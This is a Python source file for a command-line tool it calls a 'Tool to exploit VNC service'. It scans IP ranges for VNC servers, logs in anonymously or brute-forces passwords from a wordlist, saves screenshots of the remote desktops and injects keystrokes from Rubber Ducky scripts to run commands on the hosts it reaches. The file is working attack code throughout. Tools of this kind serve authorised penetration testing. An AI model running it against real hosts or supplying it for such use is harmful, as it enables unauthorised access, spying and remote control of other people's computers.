#!/usr/bin/python3

# Author: Hegusung

import argparse
import traceback
import socket
from time import sleep
from datetime import datetime
from ipaddress import IPv4Network

from vnc import VNC, VNCException

def process(ip, port, timeout, password_list, ducky_script):

    try:
        print("Connecting to %s:%d" % (ip, port))
        vnc = VNC(ip, port, timeout)
        try:
            vnc.connect()
        except VNCException as e:
            print("%s:%d\t%s" % (ip, port, vnc.version))
            raise e

        print("%s:%d\t%s" % (ip, port, vnc.version))

        if "None" in vnc.supported_security_types:
            print("%s:%d\t%s" % (ip, port, "Anonymous authentication available"))

            code, msg = vnc.auth("None")

            if code == 0:
                vnc.init()

                # take screenshot
                image = vnc.screenshot()
                image.save("%s_%d_%s.jpg" % (ip, port, str(datetime.utcnow())))
                print("%s:%d\t%s" % (ip, port, "Screenshot taken"))

                # execute ducky script
                if ducky_script != None:
                    run_ducky(vnc, ducky_script)

        elif "VNC Authentication" in vnc.supported_security_types:
            for password in password_list:
                vnc = VNC(ip, port, timeout)
                vnc.connect()

                print("%s:%d\t%s" % (ip, port, "Trying password : %s" % password))
                code, msg = vnc.auth("VNC Authentication", password=password)

                if code == 0:
                    vnc.init()

                    print("%s:%d\t%s" % (ip, port, "Password found : %s" % password))

                    # take screenshot
                    image = vnc.screenshot()
                    image.save("%s_%d_%s.jpg" % (ip, port, str(datetime.utcnow())))
                    print("%s:%d\t%s" % (ip, port, "Screenshot taken"))

                    # execute ducky script
                    if ducky_script != None:
                        run_ducky(vnc, ducky_script)

                    break
                elif code == 2:
                    break
                vnc.disconnect()
        else:
            print("%s:%d\t%s" % (ip, port, "No supported authentication mechanism"))

        vnc.disconnect()

    except socket.timeout:
        pass
    except OSError:
        pass
    except ConnectionRefusedError:
        pass
    except VNCException as e:
        print("%s:%d\t%s" % (ip, port, e))
    except Exception as e:
        traceback.print_exc()

def run_ducky(vnc, ducky_script):

    with open(ducky_script) as f:
        script = f.read()

    instr_list = getInstructions(script)

    for instr in instr_list:
        if instr[0] == 'REM':
            continue
        elif instr[0] == 'DELAY':
            sleep(int(instr[1])/1000)
        elif instr[0] == 'STRING':
            vnc.typeString(instr[1])
        else:
            keys = instr[0].split('-')
            if instr[1] != None:
                keys.append(instr[1])
            vnc.typeSpecial(tuple(keys))


def getInstructions(strData):
    #Instrution dic
    instruntions_dic = {"WINDOWS","GUI","CONTROL","CTRL","ALT","SHIFT","CTRL-ALT","CTRL-SHIFT","COMMAND-OPTION","ALT-SHIFT","ALT-TAB","DELAY","DEFAULT-DELAY","DEFAULTDELAY","DEFAULT_DELAY","ENTER","REPEAT","REM","STRING","ESCAPE","DEL","BREAK","DOWN","UP","DOWNARROW","UPARROW","LEFTARROW","RIGHTARROW","MENU","PLAY","PAUSE","STOP","MUTE","VULUMEUP","VOLUMEDOWN","SCROLLLOCK","NUMLOCK","CAPSLOCK"}

    instructions = []; last_ins = ""; delay = -1; current_ins = []
    # Handle REPEAT and DEFAULT-DELAY instructions
    for line in strData.split("\n"):
        line = line.rstrip()
        # Ignore empty lines
        if line != '\n' and line != '':
            # Ignore the comments
            if not line.startswith("//"):
                # Check if the command has any arguments
                if " " in line:
                    current_ins = line.strip().split(" ", 1)
                    if current_ins[0] not in instruntions_dic:
                        print("Instrution not found : %s" % line.strip())
                        continue
                else:
                    if line.strip() in instruntions_dic:
                        current_ins = [line.strip(), None]
                        #instructions.append(current_ins)
                    else:
                        print("Instrution not found : %s" % line.strip())
                        continue

                if current_ins[0] == "REPEAT":
                    for i in range(int(current_ins[1])):
                        if last_ins != "":
                            instructions.append(last_ins)
                            if delay != -1:
                                instructions.append(["DELAY", delay])
                        else:
                            raise Exception("ERROR: REPEAT can't be the first instruction")
                elif current_ins[0] == "DEFAULT_DELAY" or current_ins[0] == "DEFAULTDELAY" or current_ins[0] == "DEFAULT-DELAY":
                    delay = int(current_ins[1])
                else:
                    instructions.append(current_ins)
                    if delay != -1:
                        instructions.append(["DELAY", delay])
                    # Keep the previous instruction in case we need to repeat it
                    last_ins = current_ins
    if delay != -1:
        instructions.pop()

    return instructions

def main():
    parser = argparse.ArgumentParser(description='Tool to exploit VNC service', formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('ip_range', help='ip or ip range', nargs='?', default=None)
    parser.add_argument('-H', help='Host:port file', dest='host_file', default=None)
    parser.add_argument('-p', help='port', dest='port', default=5900, type=int)
    parser.add_argument('--pass', help='password', dest='password', default=None)
    parser.add_argument('-P', help='passwords file for bruteforce', dest='password_file', default=None)
    parser.add_argument('-t', help='timeout', nargs='?', default=15, type=int, dest='timeout')
    parser.add_argument('--ducky', help='ducky script to execute', dest='ducky', default=None)

    args = parser.parse_args()

    port = args.port

    password_list = []

    if args.password != None:
        password_list.append(args.password)

    if args.password_file != None:
        with open(args.password_file) as f:
            for line in f:
                line = line.rstrip()
                password_list.append(line)

    timeout = args.timeout
    ducky_script = args.ducky

    if args.ip_range != None:
        for ip in IPv4Network(args.ip_range):
            process(str(ip), port, timeout, password_list, ducky_script)

    if args.host_file != None:
        with open(args.host_file) as f:
            for line in f:
                host_port = line.split()[0]
                process(host_port.split(":")[0], int(host_port.split(":")[1]), timeout, password_list, ducky_script)



if __name__ == "__main__":
    main()


